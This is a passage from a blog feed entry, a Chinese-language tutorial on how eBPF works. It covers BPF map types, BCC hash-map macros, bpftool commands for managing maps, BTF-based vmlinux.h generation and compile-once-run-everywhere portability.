class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">    .map_type = map_type,</span><br><span class="line">    .key_size = key_size,</span><br><span class="line">    .value_size = value_size,</span><br><span class="line">    .max_entries = max_entries</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中，最关键的是设置映射的类型。内核头文件 <code>include/uapi/linux/bpf.h</code> 中的  <code>bpf_map_type</code> 定义了所有支持的映射类型，你可以使用如下的 bpftool 命令，来查询当前系统支持哪些映射类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ bpftool feature probe | grep map_type</span><br><span class="line">eBPF map_type <span class="built_in">hash</span> is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is available</span><br><span class="line">eBPF map_type percpu_hash is available</span><br><span class="line">eBPF map_type percpu_array is available</span><br><span class="line">eBPF map_type stack_trace is available</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在下面的表格中，整理了几种最常用的映射类型及其功能和使用场景：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsualMapSecne.png" class><p>如果你的 eBPF 程序使用了 BCC 库，你还可以使用预定义的宏来简化 BPF 映射的创建过程。比如，对哈希表映射来说，BCC 定义了  <code>BPF_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code>，因此，你就可以通过下面的几种方法来创建一个哈希表映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用默认参数 key_type=u64, leaf_type=u64, size=10240</span></span><br><span class="line">BPF_HASH(stats);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义key类型，保持默认 leaf_type=u64, size=10240</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_t</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> c[<span class="number">80</span>];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_HASH(counts, <span class="keyword">struct</span> <span class="type">key_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义所有参数</span></span><br><span class="line">BPF_HASH(cpu_time, <span class="type">uint64_t</span>, <span class="type">uint64_t</span>, <span class="number">4096</span>);</span><br></pre></td></tr></table></figure><p>除了创建之外，映射的删除也需要你特别注意。BPF 系统调用中并没有删除映射的命令，这是因为 <strong>BPF 映射会在用户态程序关闭文件描述符的时候自动删除（即close(fd) ）</strong>。 如果你想在程序退出后还保留映射，就需要调用  <code>BPF_OBJ_PIN</code> 命令，将映射挂载到 <code>/sys/fs/bpf</code> 中。</p><p>在调试 BPF 映射相关的问题时，你还可以通过 bpftool 来查看或操作映射的具体内容。比如，你可以通过下面这些命令创建、更新、输出以及删除映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个哈希表映射，并挂载到/sys/fs/bpf/stats_map(Key和Value的大小都是2字节)</span></span><br><span class="line">bpftool <span class="built_in">map</span> create /sys/fs/bpf/stats_map type hash key <span class="number">2</span> value <span class="number">2</span> entries <span class="number">8</span> name stats_map</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询系统中的所有映射</span></span><br><span class="line">bpftool <span class="built_in">map</span></span><br><span class="line"><span class="comment">//示例输出</span></span><br><span class="line"><span class="comment">//340: hash  name stats_map  flags 0x0</span></span><br><span class="line"><span class="comment">//        key 2B  value 2B  max_entries 8  memlock 4096B</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向哈希表映射中插入数据</span></span><br><span class="line">bpftool <span class="built_in">map</span> update name stats_map key <span class="number">0xc1</span> <span class="number">0xc2</span> value <span class="number">0xa1</span> <span class="number">0xa2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询哈希表映射中的所有数据</span></span><br><span class="line"> </span><br><span class="line">bpftool <span class="built_in">map</span> dump name stats_map</span><br><span class="line"><span class="comment">//示例输出</span></span><br><span class="line"><span class="comment">//key: c1 c2  value: a1 a2</span></span><br><span class="line"><span class="comment">//Found 1 element</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除哈希表映射</span></span><br><span class="line">rm /sys/fs/bpf/stats_map</span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/MapBasicUse.png" class><h3 id="BPF-类型格式（BTF）"><a href="#BPF-类型格式（BTF）" class="headerlink" title="BPF 类型格式（BTF）"></a>BPF 类型格式（BTF）</h3><p>了解过 BPF 辅助函数和映射之后，我们再来看一个开发 eBPF 程序时最常碰到的问题：内核数据结构的定义。</p><p>在安装 BCC 工具的时候，你可能就注意到了，内核头文件 <code>linux-headers-$(uname -r)</code> 也是必须要安装的一个依赖项。这是因为 BCC 在编译 eBPF 程序时，需要从内核头文件中找到相应的内核数据结构定义。这样，你在调用 <code>bpf_probe_read</code> 时，才能从内存地址中提取到正确的数据类型。</p><p>但是，编译时依赖内核头文件也会带来很多问题。主要有这三个方面：</p><ul><li>首先，在开发 eBPF 程序时，为了获得内核数据结构的定义，就需要引入一大堆的内核头文件；</li><li>其次，内核头文件的路径和数据结构定义在不同内核版本中很可能不同。因此，你在升级内核版本时，就会遇到找不到头文件和数据结构定义错误的问题；</li><li>最后，在很多生产环境的机器中，出于安全考虑，并不允许安装内核头文件，这时就无法得到内核数据结构的定义。<strong>在程序中重定义数据结构</strong>虽然可以暂时解决这个问题，但也很容易把使用着错误数据结构的 eBPF 程序带入新版本内核中运行。</li></ul><p>那么，这么多的问题该怎么解决呢？不用担心，BPF 类型格式（BPF Type Format, BTF）的诞生正是为了解决这些问题。</p><p>从内核 5.2 开始，只要开启了 <code>CONFIG_DEBUG_INFO_BTF</code>，在编译内核时，内核数据结构的定义就会自动内嵌在内核二进制文件 vmlinux 中。并且，你还可以借助下面的命令，把这些数据结构的定义导出到一个头文件中（通常命名为 <code>vmlinux.h</code>）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>如下图（图片来自 GRANT SELTZER 博客）所示，有了内核数据结构的定义，你在开发 eBPF 程序时只需要引入一个 <code>vmlinux.h</code> 即可，不用再引入一大堆的内核头文件了。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/vmlinuxH.png" class><p>同时，借助 BTF、bpftool 等工具，我们也可以更好地了解 BPF 程序的内部信息，这也会让调试变得更加方便。比如，在查看 BPF 映射的内容时，你可以直接看到结构化的数据，而不只是十六进制数值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bpftool map dump id 386</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="string">&quot;key&quot;</span>: 0,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;eth0&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;value&quot;</span>: 0,</span><br><span class="line">              <span class="string">&quot;ifindex&quot;</span>: 0,</span><br><span class="line">              <span class="string">&quot;mac&quot;</span>: []</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>解决了内核数据结构的定义问题，接下来的问题就是，<strong>如何让 eBPF 程序在内核升级之后，不需要重新编译就可以直接运行</strong>。eBPF 的一次编译到处执行（Compile Once Run Everywhere，简称 CO-RE）项目借助了 BTF 提供的调试信息，再通过下面的两个步骤，使得 eBPF 程序可以适配不同版本的内核：</p><ul><li>第一，通过对 BPF 代码中的访问偏移量进行重写，解决了不同内核版本中数据结构偏移量不同的问题；</li><li>第二，在 libbpf 中预定义不同内核版本中的数据结构的修改，解决了不同内核中数据结构不兼容的问题。</li></ul><p>BTF 和一次编译到处执行带来了很多的好处，但你也需要注意这一点：它们都要求比较新的内核版本（&gt;&#x3D;5.2），并且需要非常新的发行版（如 Ubuntu 20.10+、RHEL 8.2+ 等）才会默认打开内核配置 <code>CONFIG_DEBUG_INFO_BTF</code>。对于旧版本的内核，虽然它们不会再去内置 BTF 的支持，但开源社区正在尝试通过 BTFHub 等方法，为它们提供 BTF 调试信息。</p><h3 id="小结-eBPF-程序是怎么跟进程进行交互的"><a href="#小结-eBPF-程序是怎么跟进程进行交互的" class="headerlink" title="小结 eBPF 程序是怎么跟进程进行交互的"></a>小结 eBPF 程序是怎么跟进程进行交互的</h3><p>一个完整的 eBPF 程序，通常包含用户态和内核态两部分：用户态程序需要通过 BPF 系统调用跟内核进行交互，进而完成 eBPF 程序加载、事件挂载以及映射创建和更新等任务；而在内核态中，eBPF 程序也不能任意调用内核函数，而是需要通过 BPF 辅助函数完成所需的任务。尤其是在访问内存地址的时候，必须要借助  <code>bpf_probe_read</code> 系列函数读取内存数据，以确保内存的安全和高效访问。</p><p>在 eBPF 程序需要大块存储时，我们还需要根据应用场景，引入特定类型的 BPF 映射，并借助它向用户空间的程序提供运行状态的数据。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术与实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 运行原理，eBPF 学习（二）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
</feed>
